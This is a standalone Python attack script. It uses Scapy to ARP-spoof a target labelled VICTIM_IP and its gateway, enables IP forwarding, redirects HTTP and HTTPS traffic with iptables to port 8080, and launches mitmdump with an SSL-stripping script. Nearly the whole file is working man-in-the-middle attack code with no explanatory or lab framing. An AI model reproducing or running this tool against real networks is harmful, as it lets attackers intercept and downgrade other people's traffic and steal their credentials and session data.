from scapy.all import ARP, Ether, send, srp
import os
import time
import threading
import sys
import constants as c

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    arp_response = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(arp_response, count=4, verbose=False)

def start_arp_spoofing(target_ip, gateway_ip):
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        sys.exit(0)

def start_mitmproxy():
    os.system("mitmdump -s sslstripmitm.py")

target_ip = c.VICTIM_IP
gateway_ip = c.GATEWAY_IP

# Enable IP forwarding
os.system("sudo sysctl -w net.ipv4.ip_forward=1")

# Redirect HTTP and HTTPS traffic to mitmproxy
os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")

# Start ARP spoofing in a separate thread
arp_thread = threading.Thread(target=start_arp_spoofing, args=(target_ip, gateway_ip))
arp_thread.start()

# Start mitmproxy
start_mitmproxy()
